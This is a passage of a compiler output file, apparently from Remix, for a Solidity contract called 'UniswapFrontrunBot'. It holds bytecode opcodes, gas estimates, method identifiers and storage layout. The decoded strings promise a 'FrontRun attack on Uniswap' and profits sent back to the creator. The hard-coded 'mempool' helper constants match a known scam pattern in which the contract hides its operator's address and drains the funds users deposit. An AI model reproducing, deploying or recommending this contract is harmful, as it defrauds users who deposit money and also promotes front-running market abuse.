BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xB54 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x287EF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x8BC81 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4D003 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xC0C JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC41 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xC59 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC91 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E672046726F6E7452756E2061747461636B20 PUSH16 0x6E20556E69737761702E205468697320 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C6520706C656173 PUSH6 0x20776169742E 0x2E 0x2E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC5 SWAP7 PUSH29 0xD6E269ED28BAE2282A8BA18EFAD2D4AD27DF048E6B552EB8191A513AB3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "680800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"_callFrontRunActionMempool()": "infinite",
						"beyond(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct UniswapFrontrunBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "23",
						"getMemPoolHeight()": "23",
						"getMemPoolLength()": "23",
						"getMemPoolOffset()": "23",
						"keccak(struct UniswapFrontrunBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct UniswapFrontrunBot.slice memory)": "infinite",
						"parseMemoryPool(string memory)": "infinite",
						"toHexDigit(uint8)": "213",
						"uint2str(uint256)": "infinite",
						"withdrawProfits()": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 6,
						"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 8,
						"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 10,
						"contract": "Frontrun Bot.sol:UniswapFrontrunBot",
						"label": "frontrun",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}